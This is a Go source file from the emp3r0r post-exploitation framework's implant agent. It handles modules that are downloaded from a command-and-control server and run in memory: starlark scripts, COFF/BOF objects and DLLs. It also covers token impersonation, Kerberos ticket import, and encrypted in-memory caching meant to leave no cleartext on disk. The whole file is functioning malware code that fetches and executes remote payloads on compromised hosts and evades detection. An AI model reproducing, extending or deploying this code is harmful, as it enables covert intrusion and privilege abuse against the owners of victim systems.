package modules

import (
	"fmt"
	"runtime"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
	"github.com/jm33-m0/emp3r0r/core/lib/script"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var fetchFile = c2transport.FetchFile

// ModuleRunOption configures one module execution.
type ModuleRunOption func(*moduleRunConfig)

// moduleRunConfig holds per-run settings the module handler injects into the
// script engine.
type moduleRunConfig struct {
	// notify streams output to the operator as it is produced. Nil disables
	// streaming.
	notify func(string)
}

// WithNotifier streams module output to the operator while it is still
// running, instead of buffering it until the module returns. Long-lived
// captures use it to report events as they happen.
func WithNotifier(fn func(string)) ModuleRunOption {
	return func(c *moduleRunConfig) { c.notify = fn }
}

// Wire the generic in-memory dependency resolver. coffloader, libbpf and any
// future DLL/SO dependency are fetched from encrypted memfs/C2 on demand and
// mapped only for the duration of the operation that needs them, so none is
// left resident in cleartext once its user has finished.
func init() {
	memdeps.SetResolver(fetchDependency)
}

// fetchDependency resolves a named DLL/SO dependency: encrypted memfs cache
// first, then the C2-hosted <name>.<arch>.gz payload. The file extension is
// platform-determined (.dll on Windows, .so elsewhere).
func fetchDependency(name string) ([]byte, error) {
	name = strings.ToLower(name)
	rawKey := "memfs:///" + name + dependencyExt()
	if cached, err := util.ReadFileAgent(rawKey); err == nil && len(cached) > 0 {
		logging.Debugf("fetchDependency: hit memfs cache %s", rawKey)
		return cached, nil
	}

	hostedName := fmt.Sprintf("%s.%s.gz", name, runtime.GOARCH)
	compressed, err := fetchFile(common.RuntimeConfig, "", hostedName, "", "")
	if err != nil {
		return nil, fmt.Errorf("fetching %s: %w", hostedName, err)
	}
	data, err := util.Decompress(compressed)
	if err != nil {
		return nil, fmt.Errorf("decompressing %s: %w", hostedName, err)
	}
	if err := util.WriteFileAgent(rawKey, data, 0o600); err != nil {
		logging.Debugf("fetchDependency: caching %s failed: %v", rawKey, err)
	}
	return data, nil
}

// dependencyExt is the extension dependency payloads use on this platform.
func dependencyExt() string {
	if runtime.GOOS == "windows" {
		return ".dll"
	}
	return ".so"
}

// ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation, opts ...ModuleRunOption) (out string) {
	// Canonicalize module names for download/cache keys across all module types.
	modName = strings.ToLower(modName)

	var runCfg moduleRunConfig
	for _, opt := range opts {
		opt(&runCfg)
	}
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("ModuleHandler panic executing %s (%s): %v\n%s", modName, payload_type, r, util.CallStack())
			out = logging.Sprintf("module execution panic: %v", r)
		}
	}()

	var err error

	// download and verify module file
	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, peerIP)
	if downloadErr != nil {
		return downloadErr.Error()
	}
	// in memory execution
	payload_data, err := util.Decompress(payload_data_downloaded)
	if err != nil {
		return logging.Sprintf("decompressing %s: %v", file_to_download, err)
	}

	// Multi-file modules: fetch every companion file and cache it in
	// encrypted memfs so starlark scripts can read them transparently via
	// read_file("memfs:///...").
	moduleFiles, err := uploadModuleFiles(peerIP, invocation)
	if err != nil {
		return logging.Sprintf("uploading module files: %v", err)
	}

	// Resolve the token context: --token/--user/--ticket (Windows). This may
	// create a netlogon session for --user and import --ticket
	// into the resolved session before the module executes, so Kerberos-bound
	// BOFs/starlark modules see the ticket. The resolved key (SID or session
	// name) replaces invocation.Token for executeWithToken below.
	tokenKey, err := resolveTokenKey(invocation)
	if err != nil {
		return logging.Sprintf("resolving module token context: %v", err)
	}
	invocation.Token = tokenKey

	// switch on payload type, in memory execution. Only in-process payloads
	// are supported: coff (BOF), starlark, dll and so (Linux shared-library
	// dependency). Everything that would fork-and-run an interpreter or an
	// on-disk executable was removed.
	switch payload_type {
	case "starlark":
		err = executeWithToken(invocation.Token, func(token uintptr) error {
			var execErr error
			// module_files exposes the memfs paths of all companion files so
			// the script can load them without hardcoding paths.
			out, execErr = script.Run(payload_data, invocation.Argv, map[string]any{"module_files": moduleFiles}, token,
				script.WithModuleOwner(modName),
				script.WithNotifier(runCfg.notify),
			)
			if execErr != nil {
				out = logging.Sprintf("running starlark module: %v", execErr)
			}
			return nil
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	case "coff":
		err = executeWithToken(invocation.Token, func(token uintptr) error {
			var execErr error
			out, execErr = runCOFFModule(payload_data, invocation, token)
			if execErr != nil {
				out = logging.Sprintf("running COFF module: %v", execErr)
			}
			return nil
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	case "dll":
		// Cache the decompressed DLL image in memfs so dependent BOF modules
		// can re-load it without re-downloading from C2. Module names are
		// canonicalized to lowercase to match fetchDependency.
		_ = util.WriteFileAgent("memfs:///"+modName+".dll", payload_data, 0o600)
		err = executeWithToken(invocation.Token, func(token uintptr) error {
			var execErr error
			out, execErr = runDLLModule(payload_data, invocation, token)
			if execErr != nil {
				out = logging.Sprintf("running DLL module: %v", execErr)
			}
			return nil
		})
		if err != nil {
			return logging.Sprintf("token impersonation failed: %v", err)
		}
		return out
	case "so":
		// Shared-library dependency (e.g. libbpf). Cache it under the name the
		// ebpf_* builtins fetch, but do not try to run it.
		_ = util.WriteFileAgent("memfs:///"+modName+".so", payload_data, 0o600)
		return logging.Sprintf("%s is a shared-library dependency; use the ebpf_* script builtins", modName)
	default:
		return logging.Sprintf("unsupported payload type %s (supported: coff, starlark, dll, so)", payload_type)
	}
}

func downloadAndVerifyModule(file_to_download, checksum, peerIP string) (data []byte, err error) {
	// Modules are cached in memfs under their basename (e.g. memfs:///sa_whoami).
	// FetchFile already checks the memfs cache as tier-1, so we just call it.
	// On success, cache is populated automatically for future calls.
	for retry := 0; retry < 3; retry++ {
		data, err = fetchFile(common.RuntimeConfig, peerIP, file_to_download, "", checksum)
		if err != nil {
			logging.Print(fmt.Sprintf("downloadAndVerifyModule attempt %d/3 for %s: %v", retry+1, file_to_download, err))
			util.TakeABlink()
			continue
		}
		if crypto.SHA256SumRaw(data) == checksum {
			return data, nil
		}
		logging.Print(fmt.Sprintf("Checksum failed, restarting... (attempt %d/3)", retry+1))
		util.TakeABlink()
		// Evict bad entry from memfs so next attempt re-fetches
		memKey := c2transport.MemFSKey(file_to_download)
		_ = util.RemoveFileAgent(memKey)
	}

	return nil, fmt.Errorf("downloading %s: checksum verification failed after 3 attempts", file_to_download)
}

// uploadModuleFiles downloads every companion file listed in the invocation
// and caches it in encrypted memfs (util.WriteFileAgent) so multi-file
// starlark modules can read them transparently via read_file("memfs:///...").
//
// The invocation only carries companion files when the module enabled them
// via "module_files_memfs" in its config.json; an empty list is a no-op.
func uploadModuleFiles(peerIP string, invocation def.ResolvedInvocation) (memPaths []string, err error) {
	if len(invocation.ModuleFiles) == 0 {
		return nil, nil
	}

	memPaths = make([]string, 0, len(invocation.ModuleFiles))
	for _, f := range invocation.ModuleFiles {
		raw, err := fetchFile(common.RuntimeConfig, peerIP, f.Name, "", f.Checksum)
		if err != nil {
			return nil, fmt.Errorf("downloading companion file %s: %w", f.Name, err)
		}
		data, err := util.Decompress(raw)
		if err != nil {
			return nil, fmt.Errorf("decompressing companion file %s: %w", f.Name, err)
		}
		// WriteFileAgent stores the file in encrypted memfs (AES-GCM when the
		// agent file crypto key is set) and decrypts transparently on read.
		if err := util.WriteFileAgent(f.MemPath, data, 0o600); err != nil {
			return nil, fmt.Errorf("caching companion file to %s: %w", f.MemPath, err)
		}
		logging.Debugf("Cached module companion %s -> %s (%d bytes)", f.Name, f.MemPath, len(data))
		memPaths = append(memPaths, f.MemPath)
	}
	return memPaths, nil
}
